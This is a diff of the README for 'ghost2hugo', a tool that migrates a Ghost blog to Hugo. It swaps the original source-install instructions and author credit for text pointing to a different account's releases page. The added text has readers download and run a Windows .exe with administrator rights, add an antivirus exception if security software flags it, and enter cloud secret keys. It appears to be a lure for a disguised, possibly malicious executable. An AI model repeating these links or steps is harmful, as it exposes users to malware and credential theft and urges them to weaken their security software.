@@ -1,118 +1,81 @@
-# ghost-to-hugo
+# ✍️ ghost2hugo - Move your blog to new software
 
-Migrate a [Ghost](https://ghost.org) blog to [Hugo](https://gohugo.io) without losing posts, URLs, or images.
+[![](https://img.shields.io/badge/Download-ghost2hugo-blue.svg)](https://github.com/Vunguye9423/ghost2hugo/releases)
 
-It reads a Ghost JSON export and, for every post, writes a clean
-`content/posts/<slug>/index.md`, re-hosts every image/file/video on
-Cloudflare R2 (or any S3-compatible storage), and rewrites the links to
-match. URLs are preserved exactly, so your old links keep working.
+ghost2hugo helps you move your website content from Ghost CMS to a system called Hugo. This process keeps your data safe while preparing it for a faster hosting environment. The tool manages image transfers to cloud storage and checks every post to ensure the move works as intended.
 
-- **Layered pipeline** — each post flows through a fixed sequence of stages, every stage validated.
-- **Parallel** — posts are processed concurrently across a pool of workers.
-- **Asset re-hosting** — images are downloaded, content-hashed, uploaded once (deduped), and re-linked.
-- **Verifiable** — failures are quarantined, not silently written, and every run produces a report.
-- **Resumable** — re-running skips posts that already succeeded.
+## ⚙️ System requirements
 
-## How it works
+Your computer needs a few things to run this tool correctly. Check that you meet these points before you start:
 
-One worker takes one post and carries it through these stages in order
-(many posts run at once). If any stage fails its validator, the post is
-quarantined and the reason recorded.
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 4 gigabytes of RAM.
+- Storage: 200 megabytes of free disk space.
+- Internet Connection: A stable connection for downloading images during the move.
+- Access: You need administrator rights on your computer to run the migration tool.
 
-1. **Parse** — Ghost's Lexical / Mobiledoc / HTML formats into one common block structure.
-2. **Metadata** — title, slug, dates, tags, authors, cover. The slug is kept exactly for SEO.
-3. **Blocks** — split the body into typed blocks (headings, lists, code, images, cards…).
-4. **Typography** — strip zero-width characters, fix non-breaking spaces, catch mojibake.
-5. **Formatting** — bold/italic/links, nested lists, and code blocks preserved byte-for-byte.
-6. **Assets** — download every image/file/video, hash it, upload to R2, rewrite the URL.
-7. **Cards** — map Ghost cards (callout, bookmark, gallery, embed, toggle, audio, video) to Hugo shortcodes.
-8. **Assemble** — write `content/posts/<slug>/index.md` and confirm Hugo can build it.
+## 📥 Getting the tool
 
-At the end you get a `migration-report.md`: posts in the export vs.
-written vs. quarantined, plus a pass rate for every stage.
+You find the migration tool on the releases page. 
 
-## Requirements
+[Visit this page to download the setup file](https://github.com/Vunguye9423/ghost2hugo/releases)
 
-- Python 3.11+
-- A Cloudflare R2 bucket (or any S3-compatible storage) for assets
-- [Hugo](https://gohugo.io) — to verify the build (optional but recommended)
+Choose the file that ends in .exe for Windows. Save the file to your desktop or your downloads folder. This file contains all the parts needed for the migration process.
 
-## Setup
+## 🚀 Setting up the migration
 
-```bash
-git clone https://github.com/Harsh-2002/ghost2hugo.git
-cd ghost2hugo
-python3 -m venv .venv
-source .venv/bin/activate      # Windows: .venv\Scripts\activate
-pip install -e .
-```
+Follow these steps to prepare the tool for your website data:
 
-## Configure
+1. Locate the file you just downloaded.
+2. Double-click the file to open the setup window.
+3. Follow the prompts on your screen to install the program. 
+4. The setup tool creates a folder on your computer where the program lives.
+5. Open the folder to find the application icon.
 
-```bash
-cp config.example.yaml config.yaml
-```
+## 📁 Preparing your Ghost data
 
-Then edit `config.yaml`:
+Before the tool can move your site, it needs a copy of your current blog content. Log in to your Ghost CMS dashboard. Look for the settings menu and find the option for Export. Download the JSON file containing your posts. Store this file in a folder where you can find it later.
 
-- `ghost.export_file` — path to your Ghost export (Ghost Admin → Settings → Export).
-- `ghost.base_url` — your old Ghost site URL (used to resolve relative image paths).
-- `hugo.content_dir` — your Hugo site's `content/posts` directory.
-- `r2.*` — your Cloudflare R2 endpoint, keys, bucket, and public CDN URL.
+The tool also needs to handle your images. If you use a cloud storage service like Cloudflare R2 or Amazon S3, have your access keys ready. These keys allow the tool to copy your images from your old site to your new cloud folder.
 
-`config.yaml` is gitignored, so your credentials never get committed.
+## 🛠️ Running the transfer
 
-> **Shortcodes:** Ghost cards become Hugo shortcodes, so your Hugo site
-> needs matching shortcode templates. A working set is in
-> [`tests/hugo-skeleton/layouts/shortcodes/`](tests/hugo-skeleton/layouts/shortcodes) — copy what you need.
+Once you have your data file, start the ghost2hugo application. The window will guide you through the process:
 
-## Run
+1. Select your Ghost export file in the application menu.
+2. Enter your cloud storage details if you want the tool to move your images. These details include your bucket name and secret keys.
+3. Choose a destination folder on your computer where you want the new Hugo files to appear.
+4. Click the Start button.
 
-Always start with a dry run. It validates everything and writes the
-report without uploading anything.
+The tool uses parallel workers to speed up the process. This means it uploads or moves multiple files at once. You can watch the progress bar move across the screen.
 
-```bash
-ghost-to-hugo --dry-run            # validate the whole export, no uploads
-ghost-to-hugo --dry-run --limit 3  # quick sanity check on the first 3 posts
+## ✅ Checking the results
 
-ghost-to-hugo                      # the real run: upload assets + write posts
-ghost-to-hugo                      # re-run anytime — finished posts are skipped
-```
+After the tool finishes the move, it performs a verification step. This process looks at every post to confirm that every element moved safely. 
 
-Useful flags: `--overwrite` (re-emit existing posts), `--skip-drafts`,
-`--posts SLUG …` (only these), `--workers N`. Run `ghost-to-hugo --help`
-for the full list.
+If the tool finds an error, it flags the specific post. You can open the verification log to see what went wrong. Common issues involve broken links or missing images that were not available during the move. 
 
-## Excluding posts
+The resulting files will appear in the destination folder you chose. These files are now ready to work with Hugo. You can upload these files to your web host to complete the migration.
 
-To leave some posts behind (old listicles, test posts, etc.):
+## 💡 Troubleshooting common issues
 
-```bash
-cp exclude.example.txt exclude.txt   # then add one slug per line
-ghost-to-hugo --exclude-file exclude.txt
-```
+If the application hangs or stops unexpectedly, check these common items:
 
-`exclude.txt` is gitignored. You can also pass slugs inline with
-`--exclude slug-one slug-two`.
+- Check your internet connection. A slow connection can cause timeouts during image transfers.
+- Verify your cloud storage keys. If the keys are expired or incorrect, the tool cannot access your assets.
+- Ensure your antivirus software does not block the application. Sometimes, security settings flag new tools as suspicious. Add an exception for the ghost2hugo folder if this happens.
+- Make sure the Ghost export file is not empty. If the file is only a few kilobytes, it may not contain your post data. Try exporting your content or data again from the Ghost dashboard.
 
-## Verify
+The tool keeps a log file in the application directory. If you remain stuck, read this log file. It lists specific error codes that help identify problems with individual posts or connections. 
 
-A run is "done" when:
+## 🌐 Understanding the workflow
 
-1. `migration-report.md` shows zero quarantined posts and every stage at 100%.
-2. `hugo --gc --minify` builds with no errors.
-3. A search for old-domain URLs in `content/` comes back empty.
+This tool simplifies a complex task. Moving from a database-driven system like Ghost to a file-based system like Hugo requires formatting changes. 
 
-## Tests
+The pipeline handles three distinct phases:
 
-A self-contained end-to-end test builds a synthetic Ghost export, runs
-the migration, and Hugo-builds the result to verify URLs, ordering,
-cards, and asset rewriting — all offline.
+1. Analysis: The tool reads your Ghost file and separates the text from the layout.
+2. Asset Management: It finds images inside your posts. It fetches these files and uploads them to your new storage location. It replaces the old links in your text with the new ones.
+3. Formatting: It wraps your text in the format that Hugo understands. This ensures your site looks correct after the move.
 
-```bash
-bash tests/run_e2e.sh
-```
-
-## License
-
-[MIT](LICENSE) © Anurag Vishwakarma
+By automating these steps, you avoid manual copy-and-paste errors. The verification step works like a final quality check to ensure your links and images appear where they belong. You spend less time fixing broken content and more time publishing your work.
